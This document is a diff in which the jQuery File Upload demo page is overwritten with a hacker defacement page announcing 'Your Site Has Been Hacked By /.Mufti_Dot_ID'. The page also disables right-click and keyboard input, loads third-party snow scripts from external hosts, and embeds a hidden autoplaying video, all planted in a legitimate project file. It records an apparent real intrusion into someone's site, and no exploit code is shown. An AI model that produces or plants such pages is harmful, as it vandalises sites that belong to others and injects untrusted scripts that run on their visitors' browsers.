@@ -1,255 +1,560 @@
-<!DOCTYPE HTML>
-<!--
-/*
- * jQuery File Upload Plugin Demo 9.1.0
- * https://github.com/blueimp/jQuery-File-Upload
- *
- * Copyright 2010, Sebastian Tschan
- * https://blueimp.net
- *
- * Licensed under the MIT license:
- * http://www.opensource.org/licenses/MIT
- */
--->
-<html lang="en">
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<!-- Force latest IE rendering engine or ChromeFrame if installed -->
-<!--[if IE]>
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<![endif]-->
-<meta charset="utf-8">
-<title>jQuery File Upload Demo</title>
-<meta name="description" content="File Upload widget with multiple file selection, drag&amp;drop support, progress bars, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads and client-side image resizing. Works with any server-side platform (PHP, Python, Ruby on Rails, Java, Node.js, Go etc.) that supports standard HTML form file uploads.">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<!-- Bootstrap styles -->
-<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
-<!-- Generic page styles -->
-<link rel="stylesheet" href="css/style.css">
-<!-- blueimp Gallery styles -->
-<link rel="stylesheet" href="//blueimp.github.io/Gallery/css/blueimp-gallery.min.css">
-<!-- CSS to style the file input field as button and adjust the Bootstrap progress bars -->
-<link rel="stylesheet" href="css/jquery.fileupload.css">
-<link rel="stylesheet" href="css/jquery.fileupload-ui.css">
-<!-- CSS adjustments for browsers with JavaScript disabled -->
-<noscript><link rel="stylesheet" href="css/jquery.fileupload-noscript.css"></noscript>
-<noscript><link rel="stylesheet" href="css/jquery.fileupload-ui-noscript.css"></noscript>
+<body bgcolor=black>
+<table width=100% height=100%><td align=center><br><br><br><br><br><br><br><br>
+<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
+<Link href='http://dhewa.yu.tl/files/fb-indonesia.jpg' rel='SHORTCUT ICON'/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+<title>Owned by /.Mufti_Dot_ID</title>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+<style type="text/css">
+h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+
+h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+h3 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+
+h4 {color: #FF0000;font-size: 20px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+
+.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
+.jokitz1{
+	text-align : center;
+	}
+.jokitz2{
+	text-align : center;
+	font-family : Courier;
+	}
+</style>
+<script type="text/javascript">
+
+<!--
+
+//Disable right click script
+
+//visit http://www.rainbow.arch.scriptmania.com/scripts/
+
+var message="Sorry, right-click has been disabled";
+
+///////////////////////////////////
+
+function clickIE() {if (document.all) {(message);return false;}}
+
+function clickNS(e) {if
+
+(document.layers||(document.getElementById&&!document.all)) {
+
+if (e.which==2||e.which==3) {(message);return false;}}}
+
+if (document.layers)
+
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+
+document.oncontextmenu=new Function("return false")
+
+// -->
+
+</script>
+
+<!-- <script language="JavaScript1.2" type="text/javascript">
+
+function ClearError() {return true;}
+
+window.onerror = ClearError;
+
+</script> -->
+
+
+
+
+<script type="text/javascript" language="javascript">
+
+
+
+<!--
+
+var rows=1; // must be an odd number
+
+var speed=10; // lower is faster
+
+var reveal=2; // between 0 and 2 only. The higher, the faster the word appears
+
+var effectalign="center" //enter "center" to center it.
+
+
+
+/***********************************************
+
+* The Matrix Text Effect- by Richard Womersley (http://www.mf2fm.co.uk/rv)
+
+* This notice must stay intact for use
+
+* Visit http://www.dynamicdrive.com/ for full source code
+
+***********************************************/
+
+
+
+
+var w3c=document.getElementById && !window.opera;;
+
+var ie45=document.all && !window.opera;
+
+var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;
+
+var m_coch=new Array();
+
+var m_copo=new Array();
+
+window.onload=function() {
+
+	if (!w3c && !ie45) return
+
+  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];
+
+  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;
+
+  ma_txt=" "+ma_txt+" ";
+
+  columns=ma_txt.length;
+
+  if (w3c) {
+
+    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);
+
+    ma_tab=document.createElement("table");
+
+    ma_tab.setAttribute("border", 0);
+
+    ma_tab.setAttribute("align", effectalign);
+
+    ma_tab.style.backgroundColor="#000000";
+
+    ma_bod=document.createElement("tbody");
+
+    for (x=0; x<rows; x++) {
+
+      ma_row=document.createElement("tr");
+
+      for (y=0; y<columns; y++) {
+
+        matemp=document.createElement("td");
+
+        matemp.setAttribute("id", "Mx"+x+"y"+y);
+
+        matemp.className="matrix";
+
+        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));
+
+        ma_row.appendChild(matemp);
+
+      }
+
+      ma_bod.appendChild(ma_row);
+
+    }
+
+    ma_tab.appendChild(ma_bod);
+
+    matrix.appendChild(ma_tab);
+
+  } else {
+
+    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';
+
+    for (var x=0; x<rows; x++) {
+
+      ma_tab+='<t'+'r>';
+
+      for (var y=0; y<columns; y++) {
+
+        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';
+
+      }
+
+      ma_tab+='</'+'tr>';
+
+    }
+
+    ma_tab+='</'+'table>';
+
+    matrix.innerHTML=ma_tab;
+
+  }
+
+  ma_cho=ma_txt;
+
+  for (x=0; x<columns; x++) {
+
+    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));
+
+    m_copo[x]=0;
+
+  }
+
+  ma_bod=setInterval("mytricks()", speed);
+
+}
+
+
+
+function mytricks() {
+
+  x=0;
+
+  for (y=0; y<columns; y++) {
+
+    x=x+(m_copo[y]==100);
+
+    ma_row=m_copo[y]%100;
+
+    if (ma_row && m_copo[y]<100) {
+
+      if (ma_row<rows+1) {
+
+        if (w3c) {
+
+          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);
+
+          matemp.firstChild.nodeValue=m_coch[y];
+
+        }
+
+        else {
+
+          matemp=document.all["Mx"+(ma_row-1)+"y"+y];
+
+          matemp.innerHTML=m_coch[y];
+
+        }
+
+        matemp.style.color="#81F2FF";
+
+        matemp.style.fontWeight="bold";
+
+      }
+
+      if (ma_row>1 && ma_row<rows+2) {
+
+        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];
+
+        matemp.style.fontWeight="normal";
+
+        matemp.style.color="#00BBFF";
+
+      }
+
+      if (ma_row>2) {
+
+          matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];
+
+        matemp.style.color="#20FFDA";
+
+      }
+
+      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;
+
+      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);
+
+      else if (ma_row<rows+2) m_copo[y]++;
+
+      else if (m_copo[y]<100) m_copo[y]=0;
+
+    }
+
+    else if (Math.random()>0.9 && m_copo[y]<100) {
+
+      m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));
+
+      m_copo[y]++;
+
+    }
+
+  }
+
+  if (x==columns) clearInterval(ma_bod);
+
+}
+
+
+
+function zoomer(ycol) {
+
+  var mtmp, mtem, ytmp;
+
+  if (m_copo[ycol]==Math.floor(rows/2)+1) {
+
+    for (ytmp=0; ytmp<rows; ytmp++) {
+
+      if (w3c) {
+
+        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);
+
+        mtmp.firstChild.nodeValue=m_coch[ycol];
+
+      }
+
+      else {
+
+        mtmp=document.all["Mx"+ytmp+"y"+ycol];
+
+        mtmp.innerHTML=m_coch[ycol];
+
+      }
+
+      mtmp.style.color="#5BEEFF";
+
+      mtmp.style.fontWeight="bold";
+
+    }
+
+    if (Math.random()<reveal) {
+
+      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));
+
+      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);
+
+    }
+
+    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);
+
+    m_copo[ycol]+=199;
+
+    setTimeout("zoomer("+ycol+")", speed);
+
+  }
+
+  else if (m_copo[ycol]>200) {
+
+    if (w3c) {
+
+      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);
+
+      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);
+
+    }
+
+    else {
+
+      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];
+
+      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
+
+    }
+
+    mtmp.style.fontWeight="normal";
+
+    mtem.style.fontWeight="normal";
+
+    setTimeout("zoomer("+ycol+")", speed);
+
+  }
+
+  else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);
+
+  if (m_copo[ycol]>100 && m_copo[ycol]<200) {
+
+    if (w3c) {
+
+      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);
+
+      mtmp.firstChild.nodeValue=String.fromCharCode(160);
+
+      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);
+
+      mtem.firstChild.nodeValue=String.fromCharCode(160);
+
+    }
+
+    else {
+
+      mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];
+
+      mtmp.innerHTML=String.fromCharCode(160);
+
+      mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];
+
+      mtem.innerHTML=String.fromCharCode(160);
+
+    }
+
+    setTimeout("zoomer("+ycol+")", speed);
+
+  }
+
+  
+
+  //start
+
+var h1 = document.getElementsByTagName("h1")[0],
+
+text = h1.innerText || h1.textContent,
+
+split = [], i, lit = 0, timer = null;
+
+for(i = 0; i < text.length; ++i) {
+
+split.push("<span>" + text[i] + "</span>");
+
+}
+
+h1.innerHTML = split.join("");
+
+split = h1.childNodes;
+
+
+
+var flicker = function() {
+
+lit += 0.01;
+
+if(lit >= 1) {
+
+clearInterval(timer);
+
+}
+
+for(i = 0; i < split.length; ++i) {
+
+if(Math.random() < lit) {
+
+split[i].className = "neon";
+
+} else {
+
+split[i].className = "";
+
+}
+
+}
+
+}
+
+setInterval(flicker, 100);
+
+
+
+}
+
+//strat sec
+
+
+
+// end  -->
+
+</script>
+<link rel="openid.server" href="http://www.blogger.com/openid-server.g" />
 </head>
-<body>
-<div class="navbar navbar-default navbar-fixed-top">
-    <div class="container">
-        <div class="navbar-header">
-            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-fixed-top .navbar-collapse">
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-            <a class="navbar-brand" href="https://github.com/blueimp/jQuery-File-Upload">jQuery File Upload</a>
-        </div>
-        <div class="navbar-collapse collapse">
-            <ul class="nav navbar-nav">
-                <li><a href="https://github.com/blueimp/jQuery-File-Upload/tags">Download</a></li>
-                <li><a href="https://github.com/blueimp/jQuery-File-Upload">Source Code</a></li>
-                <li><a href="https://github.com/blueimp/jQuery-File-Upload/wiki">Documentation</a></li>
-                <li><a href="https://blueimp.net">&copy; Sebastian Tschan</a></li>
-            </ul>
-        </div>
-    </div>
-</div>
-<div class="container">
-    <h1>jQuery File Upload Demo</h1>
-    <h2 class="lead">Basic Plus UI version</h2>
-    <ul class="nav nav-tabs">
-        <li><a href="basic.html">Basic</a></li>
-        <li><a href="basic-plus.html">Basic Plus</a></li>
-        <li class="active"><a href="index.html">Basic Plus UI</a></li>
-        <li><a href="angularjs.html">AngularJS</a></li>
-        <li><a href="jquery-ui.html">jQuery UI</a></li>
-    </ul>
-    <br>
-    <blockquote>
-        <p>File Upload widget with multiple file selection, drag&amp;drop support, progress bars, validation and preview images, audio and video for jQuery.<br>
-        Supports cross-domain, chunked and resumable file uploads and client-side image resizing.<br>
-        Works with any server-side platform (PHP, Python, Ruby on Rails, Java, Node.js, Go etc.) that supports standard HTML form file uploads.</p>
-    </blockquote>
-    <br>
-    <!-- The file upload form used as target for the file upload widget -->
-    <form id="fileupload" action="//jquery-file-upload.appspot.com/" method="POST" enctype="multipart/form-data">
-        <!-- Redirect browsers with JavaScript disabled to the origin page -->
-        <noscript><input type="hidden" name="redirect" value="https://blueimp.github.io/jQuery-File-Upload/"></noscript>
-        <!-- The fileupload-buttonbar contains buttons to add/delete files and start/cancel the upload -->
-        <div class="row fileupload-buttonbar">
-            <div class="col-lg-7">
-                <!-- The fileinput-button span is used to style the file input field as button -->
-                <span class="btn btn-success fileinput-button">
-                    <i class="glyphicon glyphicon-plus"></i>
-                    <span>Add files...</span>
-                    <input type="file" name="files[]" multiple>
-                </span>
-                <button type="submit" class="btn btn-primary start">
-                    <i class="glyphicon glyphicon-upload"></i>
-                    <span>Start upload</span>
-                </button>
-                <button type="reset" class="btn btn-warning cancel">
-                    <i class="glyphicon glyphicon-ban-circle"></i>
-                    <span>Cancel upload</span>
-                </button>
-                <button type="button" class="btn btn-danger delete">
-                    <i class="glyphicon glyphicon-trash"></i>
-                    <span>Delete</span>
-                </button>
-                <input type="checkbox" class="toggle">
-                <!-- The global file processing state -->
-                <span class="fileupload-process"></span>
-            </div>
-            <!-- The global progress state -->
-            <div class="col-lg-5 fileupload-progress fade">
-                <!-- The global progress bar -->
-                <div class="progress progress-striped active" role="progressbar" aria-valuemin="0" aria-valuemax="100">
-                    <div class="progress-bar progress-bar-success" style="width:0%;"></div>
-                </div>
-                <!-- The extended global progress state -->
-                <div class="progress-extended">&nbsp;</div>
-            </div>
-        </div>
-        <!-- The table listing the files available for upload/download -->
-        <table role="presentation" class="table table-striped"><tbody class="files"></tbody></table>
-    </form>
-    <br>
-    <div class="panel panel-default">
-        <div class="panel-heading">
-            <h3 class="panel-title">Demo Notes</h3>
-        </div>
-        <div class="panel-body">
-            <ul>
-                <li>The maximum file size for uploads in this demo is <strong>999 KB</strong> (default file size is unlimited).</li>
-                <li>Only image files (<strong>JPG, GIF, PNG</strong>) are allowed in this demo (by default there is no file type restriction).</li>
-                <li>Uploaded files will be deleted automatically after <strong>5 minutes or less</strong> (demo files are stored in memory).</li>
-                <li>You can <strong>drag &amp; drop</strong> files from your desktop on this webpage (see <a href="https://github.com/blueimp/jQuery-File-Upload/wiki/Browser-support">Browser support</a>).</li>
-                <li>Please refer to the <a href="https://github.com/blueimp/jQuery-File-Upload">project website</a> and <a href="https://github.com/blueimp/jQuery-File-Upload/wiki">documentation</a> for more information.</li>
-                <li>Built with the <a href="http://getbootstrap.com/">Bootstrap</a> CSS framework and Icons from <a href="http://glyphicons.com/">Glyphicons</a>.</li>
-            </ul>
-        </div>
-    </div>
-</div>
-<!-- The blueimp Gallery widget -->
-<div id="blueimp-gallery" class="blueimp-gallery blueimp-gallery-controls" data-filter=":even">
-    <div class="slides"></div>
-    <h3 class="title"></h3>
-    <a class="prev">‹</a>
-    <a class="next">›</a>
-    <a class="close">×</a>
-    <a class="play-pause"></a>
-    <ol class="indicator"></ol>
-</div>
-<!-- The template to display files available for upload -->
-<script id="template-upload" type="text/x-tmpl">
-{% for (var i=0, file; file=o.files[i]; i++) { %}
-    <tr class="template-upload fade">
-        <td>
-            <span class="preview"></span>
-        </td>
-        <td>
-            <p class="name">{%=file.name%}</p>
-            <strong class="error text-danger"></strong>
-        </td>
-        <td>
-            <p class="size">Processing...</p>
-            <div class="progress progress-striped active" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0"><div class="progress-bar progress-bar-success" style="width:0%;"></div></div>
-        </td>
-        <td>
-            {% if (!i && !o.options.autoUpload) { %}
-                <button class="btn btn-primary start" disabled>
-                    <i class="glyphicon glyphicon-upload"></i>
-                    <span>Start</span>
-                </button>
-            {% } %}
-            {% if (!i) { %}
-                <button class="btn btn-warning cancel">
-                    <i class="glyphicon glyphicon-ban-circle"></i>
-                    <span>Cancel</span>
-                </button>
-            {% } %}
-        </td>
-    </tr>
-{% } %}
-</script>
-<!-- The template to display files available for download -->
-<script id="template-download" type="text/x-tmpl">
-{% for (var i=0, file; file=o.files[i]; i++) { %}
-    <tr class="template-download fade">
-        <td>
-            <span class="preview">
-                {% if (file.thumbnailUrl) { %}
-                    <a href="{%=file.url%}" title="{%=file.name%}" download="{%=file.name%}" data-gallery><img src="{%=file.thumbnailUrl%}"></a>
-                {% } %}
-            </span>
-        </td>
-        <td>
-            <p class="name">
-                {% if (file.url) { %}
-                    <a href="{%=file.url%}" title="{%=file.name%}" download="{%=file.name%}" {%=file.thumbnailUrl?'data-gallery':''%}>{%=file.name%}</a>
-                {% } else { %}
-                    <span>{%=file.name%}</span>
-                {% } %}
-            </p>
-            {% if (file.error) { %}
-                <div><span class="label label-danger">Error</span> {%=file.error%}</div>
-            {% } %}
-        </td>
-        <td>
-            <span class="size">{%=o.formatFileSize(file.size)%}</span>
-        </td>
-        <td>
-            {% if (file.deleteUrl) { %}
-                <button class="btn btn-danger delete" data-type="{%=file.deleteType%}" data-url="{%=file.deleteUrl%}"{% if (file.deleteWithCredentials) { %} data-xhr-fields='{"withCredentials":true}'{% } %}>
-                    <i class="glyphicon glyphicon-trash"></i>
-                    <span>Delete</span>
-                </button>
-                <input type="checkbox" name="delete" value="1" class="toggle">
-            {% } else { %}
-                <button class="btn btn-warning cancel">
-                    <i class="glyphicon glyphicon-ban-circle"></i>
-                    <span>Cancel</span>
-                </button>
-            {% } %}
-        </td>
-    </tr>
-{% } %}
-</script>
-<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-<!-- The jQuery UI widget factory, can be omitted if jQuery UI is already included -->
-<script src="js/vendor/jquery.ui.widget.js"></script>
-<!-- The Templates plugin is included to render the upload/download listings -->
-<script src="//blueimp.github.io/JavaScript-Templates/js/tmpl.min.js"></script>
-<!-- The Load Image plugin is included for the preview images and image resizing functionality -->
-<script src="//blueimp.github.io/JavaScript-Load-Image/js/load-image.all.min.js"></script>
-<!-- The Canvas to Blob plugin is included for image resizing functionality -->
-<script src="//blueimp.github.io/JavaScript-Canvas-to-Blob/js/canvas-to-blob.min.js"></script>
-<!-- Bootstrap JS is not required, but included for the responsive demo navigation -->
-<script src="//netdna.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
-<!-- blueimp Gallery script -->
-<script src="//blueimp.github.io/Gallery/js/jquery.blueimp-gallery.min.js"></script>
-<!-- The Iframe Transport is required for browsers without support for XHR file uploads -->
-<script src="js/jquery.iframe-transport.js"></script>
-<!-- The basic File Upload plugin -->
-<script src="js/jquery.fileupload.js"></script>
-<!-- The File Upload processing plugin -->
-<script src="js/jquery.fileupload-process.js"></script>
-<!-- The File Upload image preview & resize plugin -->
-<script src="js/jquery.fileupload-image.js"></script>
-<!-- The File Upload audio preview plugin -->
-<script src="js/jquery.fileupload-audio.js"></script>
-<!-- The File Upload video preview plugin -->
-<script src="js/jquery.fileupload-video.js"></script>
-<!-- The File Upload validation plugin -->
-<script src="js/jquery.fileupload-validate.js"></script>
-<!-- The File Upload user interface plugin -->
-<script src="js/jquery.fileupload-ui.js"></script>
-<!-- The main application script -->
-<script src="js/main.js"></script>
-<!-- The XDomainRequest Transport is included for cross-domain file deletion for IE 8 and IE 9 -->
-<!--[if (gte IE 8)&(lt IE 10)]>
-<script src="js/cors/jquery.xdr-transport.js"></script>
-<![endif]-->
-</body>
+<center>
+
+<br>
+
+<h1>Your Site Has Been Hacked By /.Mufti_Dot_ID</h1>
+
+
+<div id="matrix" class="auto-style8">Personal Newbie Defacer</div><br>
+<font face="courier new" color="Red" size"10" >We are sorry Website You Have We Hack , Security System For You So Weak ,
+by
+/.Mufti_Dot_ID </F>
+
+
+
+<center>
+
+<hr width="550px" style='color:cyan;'>
+
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+
+<span style='font: 15px Lucida Handwriting;size:15px;color:cyan;text-shadow: 0px 0px 50px;'><strong>
+<style type="text/css">
+<span style='font: 100px>
+ body{
+  font-family: Trebuchet MS, Lucida Sans Unicode, Arial, sans-serif; 
+  margin-top:0px;
+   background-repeat:no-repeat;
+  padding-top:26px;
+ }
+    #myContent, #myContent blink{
+        width:0%px;
+        height:0%px;
+        background:black;
+        color: #00FFFF;
+        font-family:IceLand;
+        font-size:20px;
+    }    
+    blink{
+        display:inline;
+    }
+    </style><br />
+    <script type="text/javascript">
+  var charIndex = -1;
+    var stringLength = 0;
+    var inputText;
+    function writeContent(init){
+     if(init){
+      inputText = document.getElementById('contentToWrite').innerHTML;
+     }
+        if(charIndex==-1){
+            charIndex = 0;
+            stringLength = inputText.length;
+        }
+        var initString = document.getElementById('myContent').innerHTML;
+  initString = initString.replace(/<SPAN.*$/gi,"");
+        
+        var theChar = inputText.charAt(charIndex);
+        var nextFourChars = inputText.substr(charIndex,4);
+        if(nextFourChars=='<br>' || nextFourChars=='<br>'){
+         theChar  = '<br>';
+         charIndex+=3;
+        }
+        initString = initString + theChar + "<span id='blink'>_</SPAN>";
+        document.getElementById('myContent').innerHTML = initString;
+
+        charIndex = charIndex/1 +1;
+  if(charIndex%2==1){
+             document.getElementById('blink').style.display='font: 100px';
+        }else{
+             document.getElementById('blink').style.display='inline';
+        }
+                
+        if(charIndex<=stringLength){
+            setTimeout('writeContent(false)',100);
+        }else{
+         blinkSpan();
+        }  
+    }
+        var currentStyle = 'inline';
+    function blinkSpan(){
+     if(currentStyle=='inline'){
+      currentStyle='none';
+     }else{
+      currentStyle='inline';
+     }
+     document.getElementById('blink').style.display = currentStyle;
+     setTimeout('blinkSpan()',9999999);
+     
+    }
+    </script>
+<embed src="" type="application/x-shockwave-flash" wmode="transparent" height="1" width="1">
 </html>
+<a href="https://www.facebook.com/profile.php?id=100009188475743" target="_blank" class="external" rel="nofollow"><font color="maroon"><img src="http://websolutions.ne.cision.com/Images/info-arrow-up.png" width="50" height="50"></font></font></a>
+<script type="text/javascript" src="http://id-pemula-javascript.googlecode.com/files/efek-salju.js" /></script>
+<script type="text/javascript" src="http://naughtyric.googlecode.com/files/jrRain.js"></script>
+<script type="text/javascript">
+snowStorm.snowColor = '#6bd'; 
+snowStorm.flakesMaxActive = 96;
+snowStorm.useTwinkleEffect = true;
+</script>
+<embed src="https://www.youtube.com/v/YrRa6dEkzmk?autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="0" height="0"></embed>
